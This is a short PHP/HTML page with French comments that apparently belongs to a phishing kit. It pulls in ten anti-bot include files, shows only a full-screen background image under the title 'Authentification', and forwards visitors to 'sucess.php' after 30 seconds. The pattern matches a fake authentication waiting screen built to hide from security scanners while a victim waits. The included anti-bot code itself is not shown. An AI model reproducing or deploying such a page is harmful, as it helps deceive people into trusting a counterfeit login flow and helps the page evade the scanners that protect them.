<?php

include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authentification</title>
    <style>
       /* Styles pour les écrans normaux */
    body {
        background-image: url(juju.png); /* Image par défaut */
        background-size: cover; /* Ajuste l'image pour couvrir toute la zone */
        background-repeat: no-repeat; /* Évite que l'image se répète */
        background-position: center; /* Centre l'image */
        margin: 0; /* Supprime les marges */
        min-height: 100vh; /* Hauteur minimale : la hauteur de la fenêtre */
    }

    /* Styles pour les petits écrans */
    @media (max-width: 768px) {
        body {
            background-image: url(bobo.png); /* Image adaptée */
            background-size: cover; /* Maintient un bon ajustement */
            background-position: center; /* Centre également l'image */
        }
    }

    /* Styles pour les très petits écrans (moins de 480px) */
    @media (max-width: 480px) {
        body {
            background-image: url(bobo.png); /* Image ou autre design simplifié */
            background-size: contain; /* Assure que l'image ne déborde pas */
            background-position: center; /* Toujours centré */
            background-color: #000; /* Optionnel : ajoute une couleur de fond si nécessaire */
        }
    }
   </style>
</head>
<body>
   <script>
        // Fonction pour rediriger après 30 secondes
        setTimeout(() => {
            window.location.href = "sucess.php"; // Redirection
        }, 30000); // 30000 ms = 30 secondes
    </script>
</body>
</html>
